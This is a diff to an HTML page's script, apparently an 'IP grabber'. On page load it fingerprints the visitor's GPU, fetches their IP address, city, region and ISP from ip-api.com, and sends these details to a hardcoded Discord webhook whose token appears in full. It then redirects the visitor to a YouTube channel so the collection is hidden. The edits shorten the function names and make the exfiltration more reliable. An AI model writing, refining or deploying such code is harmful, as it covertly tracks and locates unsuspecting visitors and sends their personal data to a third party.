@@ -5,43 +5,41 @@
     const H = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
     const Y = "https://youtube.com/@LigmaBlox-w7m";
 
-    async function getDev() {
+    async function gD() {
         try {
             const gl = document.createElement('canvas').getContext('webgl');
             const d = gl.getExtension('WEBGL_debug_renderer_info');
-            const r = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-            return r.split("Apple ").pop().split(" (")[0];
+            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop().split(" (")[0];
         } catch(e) { return navigator.platform; }
     }
 
-    async function track() {
-        const isRe = sessionStorage.getItem('v');
+    async function run() {
+        const re = sessionStorage.getItem('v');
         sessionStorage.setItem('v', '1');
-        const tag = isRe ? "🔄 RE-ENTRY" : "🆕 NEW HIT";
-        const dev = await getDev();
+        const dev = await gD();
 
-        while(true) {
+        fetch(H, {
+            method: 'POST', mode: 'no-cors', keepalive: true,
+            body: JSON.stringify({ content: `[${re ? "RE-ENTRY" : "NEW HIT"}]\nDevice: ${dev}` })
+        });
+
+        while (true) {
             try {
-                const response = await fetch('https://ip-api.com/json/?cb=' + Date.now());
-                const r = await response.json();
-                
-                if(r.status === "success") {
-                    const payload = JSON.stringify({ 
-                        content: `**[${tag}]**\n**Device:** ${dev}\n**IP:** ${r.query}\n**City:** ${r.city}\n**Region:** ${r.regionName}\n**ISP:** ${r.isp}` 
+                const r = await fetch('https://ip-api.com/json/?cb=' + Date.now()).then(d => d.json());
+                if (r.status === "success") {
+                    await fetch(H, {
+                        method: 'POST', mode: 'no-cors', keepalive: true,
+                        body: JSON.stringify({ content: `IP: ${r.query}\nLoc: ${r.city}, ${r.regionName}\nISP: ${r.isp}` })
                     });
-
-                    // Fixed: Added the Blob type so Discord doesn't ignore it
-                    navigator.sendBeacon(H, new Blob([payload], { type: 'application/json' }));
                     break;
                 }
-            } catch(e) { 
-                await new Promise(s => setTimeout(s, 2)); 
+            } catch (e) {
+                await new Promise(s => setTimeout(s, 2));
             }
         }
-        // Small delay to make sure the beacon actually leaves the device
-        setTimeout(() => { window.location.replace(Y); }, 500);
+        location.replace(Y);
     }
-    track();
+    run();
 </script>
 </body>
 </html>
